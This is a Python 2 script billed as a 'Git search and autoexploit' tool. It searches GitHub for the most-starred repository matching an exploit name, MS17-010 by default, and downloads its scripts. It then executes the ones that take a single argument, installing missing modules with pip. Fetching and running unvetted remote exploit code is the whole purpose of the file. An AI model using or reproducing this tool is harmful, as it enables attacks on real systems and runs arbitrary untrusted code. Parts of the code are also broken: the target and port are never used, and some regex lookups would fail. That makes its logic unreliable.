import argparse as parser
import re
import subprocess
import tempfile

import requests


# import virtualenv
# take a not(e) python execution should be started with correct Virtual Environment and probably cached


def main():
    pythonfiles = []
    readmefiles = []

    Parse = parser.ArgumentParser(
        description="Git search and autoexploit", formatter_class=parser.RawTextHelpFormatter)
    Parse.add_argument(
        '-q', '--query', help="the exploit you want to use", default="MS17-010")
    Parse.add_argument(
        '-t', '--target', help="IP/Hostname/ID", default="127.0.0.1")
    Parse.add_argument('-p', '--port', help="port", default="80")

    GitAPIURL = 'https://api.github.com/search/repositories?q={0}+language:python&sort=stars&order=desc'.format(
        Parse.parse_args().query)

    gitdictapi = requests.get(GitAPIURL).json()
    if gitdictapi:
        print "Found git results: {0}, but im going to use the first one".format(
            gitdictapi["total_count"])

        GitContentsUrl = gitdictapi["items"][0]["contents_url"].replace("{+path}",
                                                                        "")  # get most first most starred repo
        getdictcontent = requests.get(GitContentsUrl).json()

        for dictcontent in range(0, len(getdictcontent)):
            find = re.match('\S+\.((md)|(py))',
                            (getdictcontent[dictcontent]["name"]))
            if find:
                if find.groups()[2]:
                    pythonfiles.append(
                        getdictcontent[dictcontent]["download_url"])
                if find.groups()[1]:
                    readmefiles.append(
                        getdictcontent[dictcontent]["download_url"])

        print "getting all readmes:"
        for pyreadme in range(0, len(readmefiles)):
            readme = requests.get(readmefiles[pyreadme]).text
            if readme:
                print readme

        print "getting all scripts:"

        for pyfile in range(0, len(pythonfiles)):
            print "script path:" + pythonfiles[pyfile]

            getfile = requests.get(pythonfiles[pyfile]).text
            if getfile:
                argvargument = re.findall(
                    '\S+\s*=\s*\S*\.?argv\[.+\]', getfile)
                optargument = re.findall('add_option\(.+\)', getfile)
                parseargument = re.findall('add_argument\(.+\)', getfile)

                # one argument only :)
                if len(argvargument) == 1 or len(optargument) == 1 or len(parseargument) == 1:
                    print "Found only one argument trying to exploit...."
                    tempfilepath = tempfile.mkstemp(
                        prefix='SGitVulExec_', suffix='.py', dir='/tmp')[1]
                    gitopen = open(tempfilepath, "r+")
                    if gitopen:
                        gitopen.write(requests.get(pythonfiles[pyfile]).text)
                        gitopen.flush()
                        gitopen.close()
                        try:
                            execfile(tempfilepath, {}, {})
                            print "No exception caught"
                        except ImportError as error:
                            module = re.match(
                                'No module named (\S+)', error.message).groups()[0]
                            if module:
                                subprocess.call(
                                    ['pip', 'install', module, "--user"])

            argumentnumber = 0
            for argument in argvargument:
                argumentname = re.match(
                    '(\S+\s*)=\s*\S*\.?argv\[.+\]', argument).groups()[0]
                print "argvargument #{0}:\t Initialization:{1}\t Name:{2}".format(argumentnumber, argument,
                                                                                  argumentname)
                argumentnumber += 1
            for argument in optargument:
                argumentname = re.match(
                    'add_option\(.+\)', argument).groups()[0]
                print "argvargument #{0}:\t Initialization:{1}\t Name:{2}".format(
                    argumentnumber, argument, argument)
                argumentnumber += 1
            for argument in parseargument:
                argumentname = re.match(
                    'add_argument\(.+\)', argument).groups()[0]
                print "argvargument #{0}:\t Initialization:{1} \tName:{2}".format(
                    argumentnumber, argument, argument)
                argumentnumber += 1


main()
